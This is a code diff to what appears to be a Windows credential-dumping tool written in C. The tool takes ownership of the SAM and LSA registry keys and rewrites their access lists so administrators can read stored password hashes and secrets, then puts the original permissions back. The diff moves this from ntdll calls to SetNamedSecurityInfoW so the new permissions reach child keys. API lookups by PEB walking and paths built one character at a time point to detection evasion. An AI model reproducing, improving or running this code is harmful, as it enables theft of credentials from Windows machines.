@@ -14,6 +14,8 @@
 
 #include <Windows.h>
 #include <winternl.h>
+#include <accctrl.h>
+#include <aclapi.h>
 
 #include "include/main.h"
 #include "include/proxyNtCalls.h"
@@ -53,12 +55,9 @@ myRtlInitUnicodeString pMyRtlInitUnicodeString;
 myNtOpenKeyEx pMyNtOpenKeyEx;
 myRtlAdjustPrivilege pMyRtlAdjustPrivilege;
 myNtQuerySecurityObject pMyNtQuerySecurityObject;
-myNtSetSecurityObject pMyNtSetSecurityObject;
-myRtlCreateSecurityDescriptor pMyRtlCreateSecurityDescriptor;
-myRtlSetDaclSecurityDescriptor pMyRtlSetDaclSecurityDescriptor;
-myRtlSetOwnerSecurityDescriptor pMyRtlSetOwnerSecurityDescriptor;
-myRtlCreateAcl pMyRtlCreateAcl;
-myRtlAddAccessAllowedAceEx pMyRtlAddAccessAllowedAceEx;
+mySetEntriesInAclW pMySetEntriesInAclW;
+mySetNamedSecurityInfoW pMySetNamedSecurityInfoW;
+myLocalFree pMyLocalFree;
 
 BOOL gDebugEnabled = FALSE;
 
@@ -484,21 +483,23 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 	return;
 }
 
-static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE save, PSECURITY_DESCRIPTOR newDescriptor) {
+static void grantRegistryKeyDacl(const WCHAR RegPath[], const WCHAR RegWinPath[], PDACLSAVE save, PSID administratorSid) {
 	HANDLE key;
 	OBJECT_ATTRIBUTES attributes;
 	UNICODE_STRING UnicodeRegPath;
 	ULONG lengthBuff = MAX_SECURITY_LENGTH;
+	EXPLICIT_ACCESS_W explicitAccess;
+	PACL mergedDacl = NULL;
+	PSECURITY_DESCRIPTOR_RELATIVE savedRel;
 	DWORD ret;
 
 	DebugPrintf("Granting Administrators read access to registry key\n");
 	DebugPrintWideString("Registry key to grant read access", RegPath);
 
-	wcscpy_s(save->regPath, MAX_KEY_LENGTH, RegPath);
+	// Original owner + DACL are saved first. SeBackupPrivilege grants read access through backup semantics even when the DACL denies it.
 	pMyRtlInitUnicodeString(&UnicodeRegPath, RegPath);
 	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-	// Original owner + DACL are saved first. SeBackupPrivilege grants read access through backup semantics even when the DACL denies it.
 	ret = pMyNtOpenKeyEx(&key, READ_CONTROL, &attributes, REG_OPTION_BACKUP_RESTORE);
 	DebugPrintf("NtOpenKeyEx(backup/restore read) returned 0x%08lX\n", ret);
 
@@ -515,96 +516,62 @@ static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE save, PSECURIT
 		exit(ret);
 	}
 
-	pMyNtClose(key);
-
-	// SeTakeOwnershipPrivilege allows taking ownership of the key even when the DACL denies WRITE_OWNER to Administrators.
-	ret = pMyNtOpenKey(&key, WRITE_OWNER, &attributes);
-	DebugPrintf("NtOpenKey(key, WRITE_OWNER) returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
+	savedRel = (PSECURITY_DESCRIPTOR_RELATIVE)save->sd;
+	save->owner = NULL;
+	save->dacl = NULL;
+	if (savedRel->Owner != 0) {
+		save->owner = (PSID)((PBYTE)savedRel + savedRel->Owner);
 	}
-
-	ret = pMyNtSetSecurityObject(key, OWNER_SECURITY_INFORMATION, newDescriptor);
-	DebugPrintf("NtSetSecurityObject(key, OWNER) returned 0x%08lX; Administrators group now owns the key\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
+	if (savedRel->Dacl != 0) {
+		save->dacl = (PACL)((PBYTE)savedRel + savedRel->Dacl);
 	}
+	DebugPrintf("Original owner SID pointer: %p; original DACL pointer: %p\n", (PVOID)save->owner, (PVOID)save->dacl);
 
 	pMyNtClose(key);
 
-	// Ownership in the Administrators group grants the implicit READ_CONTROL + WRITE_DAC rights needed to swap the DACL => the new DACL inherits into every subkey the dump reads.
-	ret = pMyNtOpenKey(&key, READ_CONTROL | WRITE_DAC, &attributes);
-	DebugPrintf("NtOpenKey(key, READ_CONTROL | WRITE_DAC) returned 0x%08lX\n", ret);
+	// Merged DACL: keep the original ACEs and add one inheritable KEY_READ allow ACE for Administrators.
+	ZeroMemory(&explicitAccess, sizeof(EXPLICIT_ACCESS_W));
+	explicitAccess.grfAccessPermissions = KEY_READ;
+	explicitAccess.grfAccessMode = GRANT_ACCESS;
+	explicitAccess.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
+	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	explicitAccess.Trustee.ptstrName = (LPWSTR)administratorSid;
 
-	if (!NT_SUCCESS(ret)) {
+	ret = pMySetEntriesInAclW(1, &explicitAccess, save->dacl, &mergedDacl);
+	DebugPrintf("SetEntriesInAclW returned 0x%08lX\n", ret);
+
+	if (ret != ERROR_SUCCESS) {
 		exit(ret);
 	}
 
-	ret = pMyNtSetSecurityObject(key, DACL_SECURITY_INFORMATION, newDescriptor);
-	DebugPrintf("NtSetSecurityObject(key, DACL) returned 0x%08lX; Administrators group now holds read access\n", ret);
+	// NtSetSecurityObject does not re-propagate inheritable ACEs into child keys that already hold their own descriptor, SetNamedSecurityInfoW walks the tree and does.
+	wcscpy_s(save->regPath, MAX_KEY_LENGTH, RegWinPath);
+	ret = pMySetNamedSecurityInfoW(save->regPath, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, administratorSid, NULL, mergedDacl, NULL);
+	DebugPrintf("SetNamedSecurityInfoW returned 0x%08lX; Administrators group now holds read access\n", ret);
 
-	if (!NT_SUCCESS(ret)) {
+	if (ret != ERROR_SUCCESS) {
 		exit(ret);
 	}
 
-	pMyNtClose(key);
+	pMyLocalFree(mergedDacl);
 }
 
 static void restoreRegistryKeyAccess(PDACLSAVE save) {
-	HANDLE key;
-	OBJECT_ATTRIBUTES attributes;
-	UNICODE_STRING UnicodeRegPath;
 	DWORD ret;
 
 	DebugPrintWideString("Restoring registry key security descriptor", save->regPath);
 
-	pMyRtlInitUnicodeString(&UnicodeRegPath, save->regPath);
-	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	// Original owner + ACEs are set back. SetNamedSecurityInfoW re-propagates the original inheritable ACEs into every child key.
+	ret = pMySetNamedSecurityInfoW(save->regPath, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, save->owner, NULL, save->dacl, NULL);
+	DebugPrintf("SetNamedSecurityInfoW(restore) returned 0x%08lX; original ACEs and owner restored\n", ret);
 
-	// While we still own the key, the implicit WRITE_DAC right lets us put the original ACEs back.
-	ret = pMyNtOpenKey(&key, READ_CONTROL | WRITE_DAC, &attributes);
-	DebugPrintf("NtOpenKey(key, READ_CONTROL | WRITE_DAC) returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
+	if (ret != ERROR_SUCCESS) {
 		exit(ret);
 	}
-
-	ret = pMyNtSetSecurityObject(key, DACL_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)save->sd);
-	DebugPrintf("NtSetSecurityObject(key, DACL) returned 0x%08lX; original ACEs restored\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	pMyNtClose(key);
-
-	// Original owner restored last. SeTakeOwnershipPrivilege allows WRITE_OWNER even with the original DACL back in place.
-	pMyRtlInitUnicodeString(&UnicodeRegPath, save->regPath);
-	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-	ret = pMyNtOpenKey(&key, WRITE_OWNER, &attributes);
-	DebugPrintf("NtOpenKey(key, WRITE_OWNER) returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	ret = pMyNtSetSecurityObject(key, OWNER_SECURITY_INFORMATION, (PSECURITY_DESCRIPTOR)save->sd);
-	DebugPrintf("NtSetSecurityObject(key, OWNER) returned 0x%08lX; original owner restored\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	pMyNtClose(key);
 }
 
 void grantRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave) {
 	ULONG administratorSid[4] = {};
-	ULONG newAcl[8] = {};
-	SECURITY_DESCRIPTOR newDescriptor = {};
 	BOOLEAN wasEnabled;
 	ULONG privileges[3] = { SE_TAKE_OWNERSHIP_PRIVILEGE, SE_RESTORE_PRIVILEGE, SE_BACKUP_PRIVILEGE };
 	PISID sid = (PISID)administratorSid;
@@ -630,47 +597,13 @@ void grantRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave) {
 		}
 	}
 
-	// New owner + DACL: Administrators get KEY_READ and the ACE is inherited by every subkey the dump reads.
-	ret = pMyRtlCreateSecurityDescriptor(&newDescriptor, SECURITY_DESCRIPTOR_REVISION);
-	DebugPrintf("RtlCreateSecurityDescriptor returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	ret = pMyRtlCreateAcl((PACL)newAcl, sizeof(newAcl), ACL_REVISION);
-	DebugPrintf("RtlCreateAcl returned 0x%08lX; ACL size: %lu bytes\n", ret, (ULONG)sizeof(newAcl));
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	ret = pMyRtlAddAccessAllowedAceEx((PACL)newAcl, ACL_REVISION, CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE, KEY_READ, (PSID)administratorSid);
-	DebugPrintf("RtlAddAccessAllowedAceEx(KEY_READ, CONTAINER | OBJECT inherit) returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	ret = pMyRtlSetDaclSecurityDescriptor(&newDescriptor, TRUE, (PACL)newAcl, FALSE);
-	DebugPrintf("RtlSetDaclSecurityDescriptor returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
-	ret = pMyRtlSetOwnerSecurityDescriptor(&newDescriptor, (PSID)administratorSid, FALSE);
-	DebugPrintf("RtlSetOwnerSecurityDescriptor returned 0x%08lX\n", ret);
-
-	if (!NT_SUCCESS(ret)) {
-		exit(ret);
-	}
-
 	WCHAR RegPathSAM[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\0' };
 	WCHAR RegPathLsa[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\0' };
+	WCHAR RegWinPathSAM[MAX_PATH] = { L'M',L'A',L'C',L'H',L'I',L'N',L'E',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\0' };
+	WCHAR RegWinPathLsa[MAX_PATH] = { L'M',L'A',L'C',L'H',L'I',L'N',L'E',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\0' };
 
-	grantRegistryKeyDacl(RegPathSAM, samSave, &newDescriptor);
-	grantRegistryKeyDacl(RegPathLsa, systemSave, &newDescriptor);
+	grantRegistryKeyDacl(RegPathSAM, RegWinPathSAM, samSave, (PSID)administratorSid);
+	grantRegistryKeyDacl(RegPathLsa, RegWinPathLsa, systemSave, (PSID)administratorSid);
 }
 
 void restoreRegistryAccess(PDACLSAVE samSave, PDACLSAVE systemSave) {
@@ -1182,25 +1115,22 @@ int main(int argc, char** argv) {
 	}
 
 	DebugPrintf("Resolving registry DACL handling functions by walking PEB export tables\n");
+	HMODULE auxAdvapi32 = LoadLibraryA("advapi32.dll");
+	DebugPrintf("LoadLibraryA(advapi32.dll) returned %p\n", (PVOID)auxAdvapi32);
+
 	FARPROC auxPMyNtOpenKeyEx = myGetProcAddress(ntdlldll_RFDT, NtOpenKeyEx_RFDT);
 	FARPROC auxPMyRtlAdjustPrivilege = myGetProcAddress(ntdlldll_RFDT, RtlAdjustPrivilege_RFDT);
 	FARPROC auxPMyNtQuerySecurityObject = myGetProcAddress(ntdlldll_RFDT, NtQuerySecurityObject_RFDT);
-	FARPROC auxPMyNtSetSecurityObject = myGetProcAddress(ntdlldll_RFDT, NtSetSecurityObject_RFDT);
-	FARPROC auxPMyRtlCreateSecurityDescriptor = myGetProcAddress(ntdlldll_RFDT, RtlCreateSecurityDescriptor_RFDT);
-	FARPROC auxPMyRtlSetDaclSecurityDescriptor = myGetProcAddress(ntdlldll_RFDT, RtlSetDaclSecurityDescriptor_RFDT);
-	FARPROC auxPMyRtlSetOwnerSecurityDescriptor = myGetProcAddress(ntdlldll_RFDT, RtlSetOwnerSecurityDescriptor_RFDT);
-	FARPROC auxPMyRtlCreateAcl = myGetProcAddress(ntdlldll_RFDT, RtlCreateAcl_RFDT);
-	FARPROC auxPMyRtlAddAccessAllowedAceEx = myGetProcAddress(ntdlldll_RFDT, RtlAddAccessAllowedAceEx_RFDT);
+	FARPROC auxPMySetEntriesInAclW = myGetProcAddress(advapi32dll_RFDT, SetEntriesInAclW_RFDT);
+	FARPROC auxPMySetNamedSecurityInfoW = myGetProcAddress(advapi32dll_RFDT, SetNamedSecurityInfoW_RFDT);
+	FARPROC auxPMyLocalFree = myGetProcAddress(kernel32dll_RFDT, LocalFree_RFDT);
 
 	pMyNtOpenKeyEx = (myNtOpenKeyEx)auxPMyNtOpenKeyEx;
 	pMyRtlAdjustPrivilege = (myRtlAdjustPrivilege)auxPMyRtlAdjustPrivilege;
 	pMyNtQuerySecurityObject = (myNtQuerySecurityObject)auxPMyNtQuerySecurityObject;
-	pMyNtSetSecurityObject = (myNtSetSecurityObject)auxPMyNtSetSecurityObject;
-	pMyRtlCreateSecurityDescriptor = (myRtlCreateSecurityDescriptor)auxPMyRtlCreateSecurityDescriptor;
-	pMyRtlSetDaclSecurityDescriptor = (myRtlSetDaclSecurityDescriptor)auxPMyRtlSetDaclSecurityDescriptor;
-	pMyRtlSetOwnerSecurityDescriptor = (myRtlSetOwnerSecurityDescriptor)auxPMyRtlSetOwnerSecurityDescriptor;
-	pMyRtlCreateAcl = (myRtlCreateAcl)auxPMyRtlCreateAcl;
-	pMyRtlAddAccessAllowedAceEx = (myRtlAddAccessAllowedAceEx)auxPMyRtlAddAccessAllowedAceEx;
+	pMySetEntriesInAclW = (mySetEntriesInAclW)auxPMySetEntriesInAclW;
+	pMySetNamedSecurityInfoW = (mySetNamedSecurityInfoW)auxPMySetNamedSecurityInfoW;
+	pMyLocalFree = (myLocalFree)auxPMyLocalFree;
 
 	DebugPrintf("NtOpenKey pointer: %p\n", (PVOID)pMyNtOpenKey);
 	DebugPrintf("NtQueryKey pointer: %p\n", (PVOID)pMyNtQueryKey);
@@ -1212,12 +1142,9 @@ int main(int argc, char** argv) {
 	DebugPrintf("NtOpenKeyEx pointer: %p\n", (PVOID)pMyNtOpenKeyEx);
 	DebugPrintf("RtlAdjustPrivilege pointer: %p\n", (PVOID)pMyRtlAdjustPrivilege);
 	DebugPrintf("NtQuerySecurityObject pointer: %p\n", (PVOID)pMyNtQuerySecurityObject);
-	DebugPrintf("NtSetSecurityObject pointer: %p\n", (PVOID)pMyNtSetSecurityObject);
-	DebugPrintf("RtlCreateSecurityDescriptor pointer: %p\n", (PVOID)pMyRtlCreateSecurityDescriptor);
-	DebugPrintf("RtlSetDaclSecurityDescriptor pointer: %p\n", (PVOID)pMyRtlSetDaclSecurityDescriptor);
-	DebugPrintf("RtlSetOwnerSecurityDescriptor pointer: %p\n", (PVOID)pMyRtlSetOwnerSecurityDescriptor);
-	DebugPrintf("RtlCreateAcl pointer: %p\n", (PVOID)pMyRtlCreateAcl);
-	DebugPrintf("RtlAddAccessAllowedAceEx pointer: %p\n", (PVOID)pMyRtlAddAccessAllowedAceEx);
+	DebugPrintf("SetEntriesInAclW pointer: %p\n", (PVOID)pMySetEntriesInAclW);
+	DebugPrintf("SetNamedSecurityInfoW pointer: %p\n", (PVOID)pMySetNamedSecurityInfoW);
+	DebugPrintf("LocalFree pointer: %p\n", (PVOID)pMyLocalFree);
 
 
 	if (useRegistryFlag) {
